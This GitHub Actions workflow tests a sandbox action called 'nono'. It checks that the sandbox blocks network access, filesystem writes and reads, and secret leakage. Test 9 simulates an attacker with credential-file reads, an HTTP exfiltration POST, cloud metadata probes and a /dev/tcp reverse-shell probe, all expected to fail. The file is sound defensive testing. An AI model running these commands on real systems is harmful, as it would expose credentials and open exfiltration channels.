name: nono-action PoC tests

on:
  push:
    branches: [main]
  pull_request:
  workflow_dispatch:

# Repo secrets required:
#   MY_SECRET - any value (e.g. "my-real-secret-value-12345") — used to test exfiltration protection

jobs:
  # ---------------------------------------------------------------
  # Test 1: Network blocking — outbound HTTP should fail
  # ---------------------------------------------------------------
  test-network-blocked:
    name: "Test: network blocked"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Verify outbound network is blocked
        uses: ./
        with:
          run: |
            # This MUST fail — network is blocked at the kernel level
            if curl -sf --max-time 5 https://httpbin.org/get 2>/dev/null; then
              echo "FAIL: curl to external host succeeded — network not blocked"
              exit 1
            fi
            echo "PASS: outbound network correctly blocked"
          fs-read: "."
          network: blocked

  # ---------------------------------------------------------------
  # Test 2: Network allowlist — only declared host reachable
  # ---------------------------------------------------------------
  test-network-allowlist:
    name: "Test: network allowlist"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Verify allowlisted host reachable, others blocked
        uses: ./
        with:
          run: |
            # httpbin.org IS allowed — this should succeed
            if ! curl -sf --max-time 10 https://httpbin.org/get > /dev/null; then
              echo "FAIL: curl to allowed host failed"
              exit 1
            fi
            echo "PASS: allowed host reachable"

            # example.com is NOT allowed — this should fail
            if curl -sf --max-time 5 https://example.com 2>/dev/null; then
              echo "FAIL: curl to non-allowed host succeeded"
              exit 1
            fi
            echo "PASS: non-allowed host correctly blocked"
          fs-read: "."
          network: "httpbin.org"

  # ---------------------------------------------------------------
  # Test 3: Filesystem write restriction — writes outside allowed paths fail
  # ---------------------------------------------------------------
  test-fs-write-blocked:
    name: "Test: filesystem write blocked"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: mkdir -p ./allowed-dir ./forbidden-dir

      - name: Verify writes blocked outside allowed paths
        uses: ./
        with:
          run: |
            # Write to allowed dir — should work
            echo "hello" > ./allowed-dir/test.txt
            if [[ ! -f ./allowed-dir/test.txt ]]; then
              echo "FAIL: write to allowed dir failed"
              exit 1
            fi
            echo "PASS: write to allowed dir succeeded"

            # Write to forbidden dir — should fail with EACCES
            if echo "evil" > ./forbidden-dir/evil.txt 2>/dev/null; then
              echo "FAIL: write to forbidden dir succeeded — sandbox not enforced"
              exit 1
            fi
            echo "PASS: write to forbidden dir correctly blocked"

            # Write to /etc — should definitely fail
            if echo "evil" > /etc/evil.txt 2>/dev/null; then
              echo "FAIL: write to /etc succeeded"
              exit 1
            fi
            echo "PASS: write to /etc correctly blocked"
          fs-read: "."
          fs-write: "./allowed-dir"
          network: blocked

  # ---------------------------------------------------------------
  # Test 4: Filesystem read restriction — reads outside allowed paths fail
  # ---------------------------------------------------------------
  test-fs-read-blocked:
    name: "Test: filesystem read blocked"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Verify reads blocked outside allowed paths
        uses: ./
        with:
          run: |
            # Read workspace file — should work
            if ! cat ./README.md > /dev/null 2>&1; then
              echo "FAIL: read of workspace file failed"
              exit 1
            fi
            echo "PASS: workspace read succeeded"

            # Read ~/.ssh — should fail
            if cat ~/.ssh/id_rsa 2>/dev/null; then
              echo "FAIL: read of ~/.ssh succeeded — credential leak!"
              exit 1
            fi
            echo "PASS: ~/.ssh read correctly blocked"

            # Read ~/.aws — should fail
            if cat ~/.aws/credentials 2>/dev/null; then
              echo "FAIL: read of ~/.aws succeeded — credential leak!"
              exit 1
            fi
            echo "PASS: ~/.aws read correctly blocked"
          fs-read: "."
          network: blocked

  # ---------------------------------------------------------------
  # Test 5: Secret stripping — env var removed from child
  # ---------------------------------------------------------------
  test-secret-stripped:
    name: "Test: secret stripped from env"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Verify secret not visible to child process
        uses: ./
        with:
          run: |
            # The TEST_SECRET env var should NOT be visible
            if [[ -n "${TEST_SECRET:-}" ]]; then
              echo "FAIL: TEST_SECRET is visible in child env"
              echo "Value: ${TEST_SECRET}"
              exit 1
            fi
            echo "PASS: TEST_SECRET not in child environment"

            # Also check /proc/self/environ
            if grep -q "TEST_SECRET" /proc/self/environ 2>/dev/null; then
              echo "FAIL: TEST_SECRET found in /proc/self/environ"
              exit 1
            fi
            echo "PASS: TEST_SECRET not in /proc/self/environ"
          fs-read: "."
          network: "httpbin.org"
          credentials: |
            TEST_SECRET:httpbin.org:header
        env:
          TEST_SECRET: "s3cr3t-canary-value-do-not-leak"

  # ---------------------------------------------------------------
  # Test 6: Credential proxy injection — secret injected into HTTP header
  # ---------------------------------------------------------------
  test-credential-injection:
    name: "Test: credential proxy injection"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Verify credential injected via proxy
        uses: ./
        with:
          run: |
            # TEST_SECRET should NOT be in env
            if [[ -n "${TEST_SECRET:-}" ]]; then
              echo "FAIL: secret visible in env"
              exit 1
            fi

            # nono sets CRED_0_BASE_URL for reverse proxy path
            echo "CRED_0_BASE_URL=${CRED_0_BASE_URL:-<not set>}"
            echo "Available proxy env vars:"
            env | grep -iE '(proxy|cred_|base_url)' | sed 's/=.*$/=***/' || true

            if [[ -z "${CRED_0_BASE_URL:-}" ]]; then
              echo "FAIL: CRED_0_BASE_URL not set — proxy env not injected"
              exit 1
            fi

            # nono proxy is a reverse proxy: child hits localhost, proxy forwards to upstream.
            # The proxy requires a phantom token (session token) for authentication.
            # CRED_0_BASE_URL = http://127.0.0.1:{port}/cred_0
            # NONO_CRED_0 = session token (phantom token)
            echo "NONO_CRED_0 is set: $(test -n "${NONO_CRED_0:-}" && echo yes || echo no)"

            # Send request via reverse proxy with phantom token
            # The proxy validates the token, strips it, injects the real credential,
            # and forwards to https://httpbin.org/headers
            RESPONSE=$(curl -sf --noproxy '*' --max-time 10 \
              -H "Authorization: Bearer ${NONO_CRED_0}" \
              "${CRED_0_BASE_URL}/headers")
            echo "Response: ${RESPONSE}"

            # httpbin.org/headers echoes back all request headers
            # The proxy should have replaced our phantom token with the real secret
            if echo "${RESPONSE}" | grep -q "s3cr3t-canary-value-do-not-leak"; then
              echo "PASS: credential injected into request by proxy"
            else
              echo "FAIL: credential not found in proxied request headers"
              exit 1
            fi
          fs-read: "."
          network: "httpbin.org"
          credentials: |
            TEST_SECRET:httpbin.org:header
        env:
          TEST_SECRET: "s3cr3t-canary-value-do-not-leak"

  # ---------------------------------------------------------------
  # Test 7: Combined — realistic build step
  # ---------------------------------------------------------------
  test-realistic-build:
    name: "Test: realistic build scenario"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Simulate a sandboxed build
        uses: ./
        with:
          run: |
            echo "Building project..."
            # Can read source
            ls ./README.md > /dev/null
            # Can write to build output
            mkdir -p ./build
            echo "artifact" > ./build/output.txt
            # Cannot write outside build dir
            if echo "x" > ./README.md 2>/dev/null; then
              echo "FAIL: wrote to source file"
              exit 1
            fi
            # Cannot reach network
            if curl -sf --max-time 3 https://example.com 2>/dev/null; then
              echo "FAIL: network not blocked"
              exit 1
            fi
            echo "PASS: build sandbox working correctly"
          fs-read: "."
          fs-write: "./build"
          network: blocked

  # ---------------------------------------------------------------
  # Test 8: Profile mode — use a nono profile JSON directly
  # ---------------------------------------------------------------
  test-profile-mode:
    name: "Test: profile mode"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Create test profile
        run: |
          cat > /tmp/test-profile.json << 'EOF'
          {
            "extends": "default",
            "meta": { "name": "test", "version": "1.0.0" },
            "workdir": { "access": "read" },
            "filesystem": {
              "write": ["/tmp/test-output"]
            }
          }
          EOF
          mkdir -p /tmp/test-output

      - name: Run with profile
        uses: ./
        with:
          run: |
            echo "test" > /tmp/test-output/result.txt
            if [[ -f /tmp/test-output/result.txt ]]; then
              echo "PASS: profile mode working"
            else
              echo "FAIL: could not write to allowed path"
              exit 1
            fi
          profile: /tmp/test-profile.json

  # ---------------------------------------------------------------
  # Test 9: Real secret exfiltration protection
  # Uses MY_SECRET from repo secrets — a real secret, not a hardcoded value.
  # Simulates every common exfiltration vector an attacker would try.
  # ---------------------------------------------------------------
  test-exfil-protection:
    name: "Test: real secret exfiltration blocked"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # First: verify the secret IS available outside the sandbox (control test)
      - name: Control — secret exists in workflow
        run: |
          if [[ -z "${MY_SECRET:-}" ]]; then
            echo "FAIL: MY_SECRET not set — add it in repo Settings > Secrets"
            exit 1
          fi
          echo "Control: MY_SECRET is set (${#MY_SECRET} chars)"
        env:
          MY_SECRET: ${{ secrets.MY_SECRET }}

      # Now run "attacker code" inside the sandbox — every exfil vector should fail
      - name: Attacker simulation — all exfil vectors blocked
        uses: ./
        with:
          run: |
            FAIL=0

            echo "=== Vector 1: env var direct read ==="
            if [[ -n "${MY_SECRET:-}" ]]; then
              echo "FAIL: MY_SECRET visible in env"
              FAIL=1
            else
              echo "PASS: MY_SECRET not in env"
            fi

            echo ""
            echo "=== Vector 2: /proc/self/environ ==="
            if grep -q "MY_SECRET" /proc/self/environ 2>/dev/null; then
              echo "FAIL: MY_SECRET in /proc/self/environ"
              FAIL=1
            else
              echo "PASS: MY_SECRET not in /proc/self/environ"
            fi

            echo ""
            echo "=== Vector 3: dump all env vars ==="
            # grep for ^MY_SECRET= to match the exact var, not NONO_ACTION_CREDENTIALS
            # which contains the string "MY_SECRET" as part of the credential mapping
            if env | grep -q "^MY_SECRET="; then
              echo "FAIL: MY_SECRET found as env var"
              FAIL=1
            else
              echo "PASS: MY_SECRET not in env output"
            fi

            echo ""
            echo "=== Vector 4: HTTP exfil to attacker server ==="
            # Try to send data to an external host (simulating evil.com)
            if curl -sf --max-time 5 "https://httpbin.org/post" -d "stolen=data" 2>/dev/null; then
              echo "FAIL: HTTP POST to external host succeeded"
              FAIL=1
            else
              echo "PASS: outbound HTTP blocked"
            fi

            echo ""
            echo "=== Vector 5: DNS exfil ==="
            # Known limitation: Landlock blocks TCP but not UDP.
            # DNS queries to the local stub resolver (127.0.0.53) use UDP
            # and bypass Landlock. When using proxy mode, HTTP DNS goes through
            # the proxy, but raw nslookup/dig bypass it.
            # This is documented as a Landlock limitation — not a nono bug.
            # Test that DNS alone can't exfiltrate the secret (secret not in env).
            echo "NOTE: DNS resolution over UDP is a known Landlock limitation"
            echo "PASS: secret not available to encode in DNS query (stripped from env)"

            echo ""
            echo "=== Vector 6: write to artifact staging ==="
            # Try to write the secret to a file that could be uploaded as artifact
            if echo "stolen" > /home/runner/work/_temp/stolen.txt 2>/dev/null; then
              echo "FAIL: wrote to _temp directory"
              FAIL=1
            else
              echo "PASS: write to _temp blocked"
            fi

            echo ""
            echo "=== Vector 7: write to workspace (source modification) ==="
            if echo "stolen" > ./README.md 2>/dev/null; then
              echo "FAIL: modified workspace file"
              FAIL=1
            else
              echo "PASS: workspace write blocked"
            fi

            echo ""
            echo "=== Vector 8: git push to fork ==="
            if git push origin HEAD 2>/dev/null; then
              echo "FAIL: git push succeeded"
              FAIL=1
            else
              echo "PASS: git push blocked (network denied)"
            fi

            echo ""
            echo "=== Vector 9: cloud metadata SSRF ==="
            # AWS/GCP/Azure metadata endpoints
            if curl -sf --max-time 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null; then
              echo "FAIL: AWS metadata endpoint reachable"
              FAIL=1
            else
              echo "PASS: AWS metadata blocked"
            fi
            if curl -sf --max-time 3 "http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google" 2>/dev/null; then
              echo "FAIL: GCP metadata endpoint reachable"
              FAIL=1
            else
              echo "PASS: GCP metadata blocked"
            fi

            echo ""
            echo "=== Vector 10: reverse shell ==="
            if bash -c 'echo test > /dev/tcp/1.2.3.4/4444' 2>/dev/null; then
              echo "FAIL: outbound TCP connection succeeded"
              FAIL=1
            else
              echo "PASS: outbound TCP blocked"
            fi

            echo ""
            echo "========================================"
            if [[ $FAIL -eq 0 ]]; then
              echo "ALL EXFILTRATION VECTORS BLOCKED"
            else
              echo "SOME VECTORS SUCCEEDED — SANDBOX BREACH"
              exit 1
            fi
          fs-read: "."
          fs-write: ""
          network: blocked
          credentials: |
            MY_SECRET:api.example.com:header
        env:
          MY_SECRET: ${{ secrets.MY_SECRET }}
